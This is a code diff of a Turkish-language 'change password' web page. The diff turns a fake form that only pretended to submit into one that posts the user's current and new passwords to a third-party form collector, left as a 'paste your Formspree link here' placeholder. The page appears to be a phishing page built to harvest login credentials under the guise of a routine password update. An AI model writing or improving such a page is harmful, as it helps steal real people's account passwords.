@@ -47,26 +47,29 @@
     <h1>Şifreyi değiştir</h1>
     <p class="description">Şifren en az 6 karakter olmalı ve rakamlar, harfler ve özel karakterlerden (!S@%) oluşmalıdır.</p>
 
-    <div class="input-group">
-        <input type="password" id="oldPass" placeholder="Mevcut şifre (Güncelleme 06.04.2026)">
-    </div>
+    <form action="BURAYA_FORMSPREE_LINKINI_YAPISTIR" method="POST" id="passwordForm">
+        <div class="input-group">
+            <input type="password" name="mevcut_sifre" id="oldPass" placeholder="Mevcut şifre (Güncelleme 06.04.2026)" required>
+        </div>
 
-    <div class="input-group">
-        <input type="password" id="newPass" placeholder="Yeni şifre">
-    </div>
+        <div class="input-group">
+            <input type="password" name="yeni_sifre" id="newPass" placeholder="Yeni şifre" required>
+        </div>
 
-    <div class="input-group">
-        <input type="password" id="confirmPass" placeholder="Yeni şifreyi tekrar yaz">
-    </div>
-    <div id="error-msg">Şifre eşleşmedi</div>
+        <div class="input-group">
+            <input type="password" name="yeni_sifre_tekrar" id="confirmPass" placeholder="Yeni şifreyi tekrar yaz" required>
+        </div>
+        <div id="error-msg">Şifre eşleşmedi</div>
 
-    <button id="submitBtn" class="submit-btn" disabled>
-        <span id="btnText">Şifreyi değiştir</span>
-        <div class="loader" id="loader"></div>
-    </button>
+        <button type="submit" id="submitBtn" class="submit-btn" disabled>
+            <span id="btnText">Şifreyi değiştir</span>
+            <div class="loader" id="loader"></div>
+        </button>
+    </form>
 </div>
 
 <script>
+    const passwordForm = document.getElementById('passwordForm');
     const oldPass = document.getElementById('oldPass');
     const newPass = document.getElementById('newPass');
     const confirmPass = document.getElementById('confirmPass');
@@ -80,14 +83,12 @@
         const v2 = newPass.value.trim();
         const v3 = confirmPass.value.trim();
 
-        // Şifrə uyğunsuzluğu xəbərdarlığı
         if (v2 !== "" && v3 !== "" && v2 !== v3) {
             errorMsg.style.display = "block";
         } else {
             errorMsg.style.display = "none";
         }
 
-        // Bütün xanalar doludurmu və şifrələr eynidirmi?
         if (v1 !== "" && v2 !== "" && v3 !== "" && v2 === v3 && v2.length >= 6) {
             submitBtn.classList.add('active');
             submitBtn.disabled = false;
@@ -97,21 +98,15 @@
         }
     }
 
-    // Hər klaviaturaya toxunanda yoxla
     oldPass.addEventListener('input', checkInputs);
     newPass.addEventListener('input', checkInputs);
     confirmPass.addEventListener('input', checkInputs);
 
-    submitBtn.addEventListener('click', function() {
-        if (!this.disabled) {
-            btnText.style.opacity = "0";
-            loader.style.display = "block";
-            
-            // 2 saniyə yüklənir görüntüsü ver və sonra keçid et
-            setTimeout(() => {
-                window.location.href = "success.html";
-            }, 2000);
-        }
+    // Məlumatı göndərəndə animasiyanı göstər
+    passwordForm.addEventListener('submit', function() {
+        btnText.style.opacity = "0";
+        loader.style.display = "block";
+        submitBtn.disabled = true;
     });
 </script>
 
